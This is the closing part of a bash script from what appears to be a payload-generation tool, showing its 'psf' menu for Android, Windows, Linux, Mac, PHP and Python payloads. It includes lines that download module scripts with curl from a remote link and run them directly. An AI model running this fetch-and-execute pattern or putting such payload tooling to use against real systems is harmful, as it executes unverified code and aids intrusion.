     then
     input=""
       if [[ ! $__return__ == 105 ]];then
       bash programs/withINFO/info
       else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withINFO/info |
       printf "${b0SIGN} Downloading Program...\r"
       printf "                                              \r"
       bash info
       fi
       fi
     theERROR
     extarnalCMD
     done

elif [[ ${command} == "use with:payload/handler" ]]
  then
     MODE=withINFO
     echo -e "${b0SIGN} Using configured with:payload mode"
     while true
     do
     printf "${R4}psf${R0} use(${C1}program/with:payload${R0})${R0} > "
     read -r input 
     command=""
     if [[ $input == "list" ]]
     then
     list4() {
     declare -a payloadS=(
'Android Payload'
'Windows Payload'
'Linux Payload'
'Mac Payload'
'Php Payload'
'Python Payload'
)
     echo
     for i in {0..5}
     do
     printf "${C4}(${R0}0$((i+1))${C4})${R0} ${payloadS[i]}\n"
     WAIT
     done
     echo
     }
     list4
     elif [[ ${input} =~ ^-?[0-9]*[.,]?[0-9]*[eE]?-?[0-9]+$ ]]
     then
     if [[ ${input} -lt 7 ]]
     then
#     input=""
       if [[ ! $__return__ == 105 ]];then
       source programs/withPAYLOAD/payload
       else
       cd $TMPDIR || exit 1
       curl -sLO ${RAWLINK}/programs/withPAYLOAD/payload |
       printf "${b0SIGN} Downloading Program...\r"
       printf "                                              \r"
       source payload
       fi
       fi
       fi
     theERROR
     extarnalCMD
     done
  fi
}

readCOMMAND() {
interrupt
while true
do
psf
getCOMMANDS
if [[ ${TRUE} == "true" ]]
then
  break & readCONFIGURE
fi
input=""
theERROR
done
}

sudoPERM
readCOMMAND

# <<<--- End --->>>
